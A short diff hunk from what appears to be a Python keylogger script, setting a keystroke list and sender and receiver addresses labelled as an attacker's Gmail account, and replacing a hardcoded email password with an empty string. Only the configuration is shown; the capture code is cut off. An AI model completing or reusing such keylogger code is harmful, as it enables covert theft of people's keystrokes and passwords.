@@ -8,7 +8,7 @@ count = 0
 keys = []
 
 sender_email = "fsattacker247@gmail.com"
-sender_password = "FS123456789"
+sender_password = ""
 reciever_email = "fsattacker247@gmail.com"
 
 # Define a keystroke 
